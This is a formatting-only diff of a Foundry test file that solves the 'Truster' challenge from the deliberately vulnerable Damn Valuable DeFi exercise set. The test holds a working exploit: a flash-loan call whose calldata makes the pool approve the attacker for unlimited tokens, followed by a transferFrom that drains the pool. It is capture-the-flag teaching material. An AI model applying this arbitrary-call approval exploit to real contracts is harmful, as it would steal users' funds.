@@ -9,8 +9,7 @@ import {DamnValuableToken} from "@main/DamnValuableToken.sol";
 import {TrusterLenderPool} from "@main/truster/TrusterLenderPool.sol";
 
 contract TrusterTest is Test {
-
-    string mnemonic ="test test test test test test test test test test test junk";
+    string mnemonic = "test test test test test test test test test test test junk";
     uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
 
     address deployer = vm.addr(deployerPrivateKey);
@@ -25,42 +24,41 @@ contract TrusterTest is Test {
         vm.startPrank(deployer);
         vm.deal(deployer, 1 ether);
         vm.deal(attacker, 1 ether);
-        
+
         vm.label(deployer, "Deployer");
         vm.label(attacker, "Attacker");
 
         token = new DamnValuableToken();
         pool = new TrusterLenderPool(token);
 
-        vm.stopPrank(  );
+        vm.stopPrank();
     }
 
     modifier beforeEach() {
         vm.startPrank(deployer);
 
-        assertEq(address(pool.token()) , address(token));
+        assertEq(address(pool.token()), address(token));
         token.transfer(address(pool), TOKENS_IN_POOL);
-        assertEq( token.balanceOf(address(pool)) ,TOKENS_IN_POOL);
-        assertEq( token.balanceOf(attacker) ,0);
+        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
+        assertEq(token.balanceOf(attacker), 0);
 
-        vm.stopPrank(  );
+        vm.stopPrank();
         _;
     }
 
-    function test_isSolved( ) public beforeEach() {
+    function test_isSolved() public beforeEach {
         vm.startPrank(attacker);
 
         // encodeWithSignature
         // bytes memory data = abi.encodeWithSignature("approve(address,uint256)",attacker, type(uint256).max );
         // encodeWithSelector
-        bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, attacker, type(uint256).max );
+        bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, attacker, type(uint256).max);
 
-        pool.flashLoan( TOKENS_IN_POOL, address(pool), address(token), data);
+        pool.flashLoan(TOKENS_IN_POOL, address(pool), address(token), data);
         token.transferFrom(address(pool), attacker, TOKENS_IN_POOL);
 
-        assertEq( token.balanceOf(address(pool)) ,0);
+        assertEq(token.balanceOf(address(pool)), 0);
 
-        vm.stopPrank( );
+        vm.stopPrank();
     }
-
 }
